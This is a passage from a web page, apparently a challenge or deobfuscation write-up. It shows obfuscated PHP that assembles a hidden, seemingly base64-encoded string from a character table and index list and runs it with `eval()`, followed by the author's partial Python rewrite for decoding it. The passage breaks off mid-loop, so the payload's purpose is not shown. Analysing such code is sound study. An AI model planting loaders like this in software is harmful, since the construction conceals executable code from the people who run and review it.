style=color:#2aa198>91</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>21</span>, <span style=color:#2aa198>47</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>8</span>, <span style=color:#2aa198>10</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>82</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>82</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>29</span>, <span style=color:#2aa198>29</span>, <span style=color:#2aa198>47</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>$do_me</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> (<span style=color:#268bd2>$i</span><span style=color:#719e07>=</span><span style=color:#2aa198>0</span>;<span style=color:#268bd2>$i</span><span style=color:#719e07>&lt;</span>count(<span style=color:#268bd2>$order</span>);<span style=color:#268bd2>$i</span><span style=color:#719e07>++</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#268bd2>$do_me</span><span style=color:#719e07>=</span><span style=color:#268bd2>$do_me</span><span style=color:#719e07>.</span><span style=color:#268bd2>$terms</span>[<span style=color:#268bd2>$order</span>[<span style=color:#268bd2>$i</span>]];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>eval</span>(<span style=color:#268bd2>$do_me</span>);
</span></span><span style=display:flex><span><span style=color:#719e07>?&gt;</span>
</span></span></code></pre></td></tr></table></div></div></div></figure><p>Find an online tool to run this PHP code or re-write it in Python . My Python code:</p><figure class=code><figcaption><span>Code re-written in Python</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>terms <span style=color:#719e07>=</span> [<span style=color:#2aa198>&#34;M&#34;</span>, <span style=color:#2aa198>&#34;Z&#34;</span>, <span style=color:#2aa198>&#34;]&#34;</span>, <span style=color:#2aa198>&#34;p&#34;</span>, <span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\\</span><span style=color:#2aa198>&#34;</span>, <span style=color:#2aa198>&#34;w&#34;</span>, <span style=color:#2aa198>&#34;f&#34;</span>, <span style=color:#2aa198>&#34;1&#34;</span>, <span style=color:#2aa198>&#34;v&#34;</span>, <span style=color:#2aa198>&#34;&lt;&#34;</span>, <span style=color:#2aa198>&#34;a&#34;</span>, <span style=color:#2aa198>&#34;Q&#34;</span>, <span style=color:#2aa198>&#34;z&#34;</span>, <span style=color:#2aa198>&#34; &#34;</span>, <span style=color:#2aa198>&#34;s&#34;</span>, <span style=color:#2aa198>&#34;m&#34;</span>, <span style=color:#2aa198>&#34;+&#34;</span>, <span style=color:#2aa198>&#34;E&#34;</span>, <span style=color:#2aa198>&#34;D&#34;</span>, <span style=color:#2aa198>&#34;g&#34;</span>, <span style=color:#2aa198>&#34;W&#34;</span>, <span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\&#34;</span><span style=color:#2aa198>&#34;</span>, <span style=color:#2aa198>&#34;q&#34;</span>, <span style=color:#2aa198>&#34;y&#34;</span>, <span style=color:#2aa198>&#34;T&#34;</span>, <span style=color:#2aa198>&#34;V&#34;</span>, <span style=color:#2aa198>&#34;n&#34;</span>, <span style=color:#2aa198>&#34;S&#34;</span>, <span style=color:#2aa198>&#34;X&#34;</span>, <span style=color:#2aa198>&#34;)&#34;</span>, <span style=color:#2aa198>&#34;9&#34;</span>, <span style=color:#2aa198>&#34;C&#34;</span>, <span style=color:#2aa198>&#34;P&#34;</span>, <span style=color:#2aa198>&#34;r&#34;</span>, <span style=color:#2aa198>&#34;&amp;&#34;</span>, <span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\&#39;</span><span style=color:#2aa198>&#34;</span>, <span style=color:#2aa198>&#34;!&#34;</span>, <span style=color:#2aa198>&#34;x&#34;</span>, <span style=color:#2aa198>&#34;G&#34;</span>, <span style=color:#2aa198>&#34;:&#34;</span>, <span style=color:#2aa198>&#34;2&#34;</span>, <span style=color:#2aa198>&#34;~&#34;</span>, <span style=color:#2aa198>&#34;O&#34;</span>, <span style=color:#2aa198>&#34;h&#34;</span>, <span style=color:#2aa198>&#34;u&#34;</span>, <span style=color:#2aa198>&#34;U&#34;</span>, <span style=color:#2aa198>&#34;@&#34;</span>, <span style=color:#2aa198>&#34;;&#34;</span>, <span style=color:#2aa198>&#34;H&#34;</span>, <span style=color:#2aa198>&#34;3&#34;</span>, <span style=color:#2aa198>&#34;F&#34;</span>, <span style=color:#2aa198>&#34;6&#34;</span>, <span style=color:#2aa198>&#34;b&#34;</span>, <span style=color:#2aa198>&#34;L&#34;</span>, <span style=color:#2aa198>&#34;&gt;&#34;</span>, <span style=color:#2aa198>&#34;^&#34;</span>, <span style=color:#2aa198>&#34;,&#34;</span>, <span style=color:#2aa198>&#34;.&#34;</span>, <span style=color:#2aa198>&#34;l&#34;</span>, <span style=color:#2aa198>&#34;$&#34;</span>, <span style=color:#2aa198>&#34;d&#34;</span>, <span style=color:#2aa198>&#34;`&#34;</span>, <span style=color:#2aa198>&#34;%&#34;</span>, <span style=color:#2aa198>&#34;N&#34;</span>, <span style=color:#2aa198>&#34;*&#34;</span>, <span style=color:#2aa198>&#34;[&#34;</span>, <span style=color:#2aa198>&#34;0&#34;</span>, <span style=color:#2aa198>&#34;}&#34;</span>, <span style=color:#2aa198>&#34;J&#34;</span>, <span style=color:#2aa198>&#34;-&#34;</span>, <span style=color:#2aa198>&#34;5&#34;</span>, <span style=color:#2aa198>&#34;_&#34;</span>, <span style=color:#2aa198>&#34;A&#34;</span>, <span style=color:#2aa198>&#34;=&#34;</span>, <span style=color:#2aa198>&#34;{&#34;</span>, <span style=color:#2aa198>&#34;k&#34;</span>, <span style=color:#2aa198>&#34;o&#34;</span>, <span style=color:#2aa198>&#34;7&#34;</span>, <span style=color:#2aa198>&#34;#&#34;</span>, <span style=color:#2aa198>&#34;i&#34;</span>, <span style=color:#2aa198>&#34;I&#34;</span>, <span style=color:#2aa198>&#34;Y&#34;</span>, <span style=color:#2aa198>&#34;(&#34;</span>, <span style=color:#2aa198>&#34;j&#34;</span>, <span style=color:#2aa198>&#34;/&#34;</span>, <span style=color:#2aa198>&#34;?&#34;</span>, <span style=color:#2aa198>&#34;K&#34;</span>, <span style=color:#2aa198>&#34;c&#34;</span>, <span style=color:#2aa198>&#34;B&#34;</span>, <span style=color:#2aa198>&#34;t&#34;</span>, <span style=color:#2aa198>&#34;R&#34;</span>, <span style=color:#2aa198>&#34;4&#34;</span>, <span style=color:#2aa198>&#34;8&#34;</span>, <span style=color:#2aa198>&#34;e&#34;</span>, <span style=color:#2aa198>&#34;|&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>order<span style=color:#719e07>=</span> [<span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>73</span>, <span style=color:#2aa198>13</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>10</span>, <span style=color:#2aa198>20</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>76</span>, <span style=color:#2aa198>10</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>76</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>20</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>60</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>60</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>80</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>3</span>, <span style=color:#2aa198>86</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>88</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>80</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>20</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>76</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>15</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>88</span>, <span style=color:#2aa198>32</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>52</span>, <span style=color:#2aa198>80</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>83</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>72</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>60</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>72</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>5</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>0</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>17</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>25</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>87</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>18</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>48</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>11</span>, <span style=color:#2aa198>79</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>3</span>, <span style=color:#2aa198>42</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>88</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>47</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>73</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>68</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>63</span>, <span style=color:#2aa198>8</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>38</span>, <span style=color:#2aa198>45</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>15</span>, <span style=color:#2aa198>50</span>, <span style=color:#2aa198>12</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>24</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>66</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>90</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>23</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>28</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>43</span>, <span style=color:#2aa198>52</span>, <span style=color:#2aa198>31</span>, <span style=color:#2aa198>19</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>81</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>30</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>1</span>, <span style=color:#2aa198>27</span>, <span style=color:#2aa198>75</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>35</span>, <span style=color:#2aa198>47</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>73</span>, <span style=color:#2aa198>21</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>40</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>77</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>6</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>49</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>6</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>7</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>91</span>, <span style=color:#2aa198>4</span>, <span style=color:#2aa198>37</span>, <span style=color:#2aa198>51</span>, <span style=color:#2aa198>70</span>, <span style=color:#2aa198>21</span>, <span style=color:#2aa198>47</span>, <span style=color:#2aa198>93</span>, <span style=color:#2aa198>8</span>, <span style=color:#2aa198>10</span>, <span style=color:#2aa198>58</span>, <span style=color:#2aa198>82</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>82</span>, <span style=color:#2aa198>59</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>71</span>, <span style=color:#2aa198>29</span>, <span style=color:#2aa198>29</span>, <span style=color:#2aa198>47</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>do_me <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> i <span style=color:#719e07>in</span> <span style=color:#b58900>range</span>(<span style=color:#2aa198>0</span>,<span style=color:#b58900>len</span>(order)):
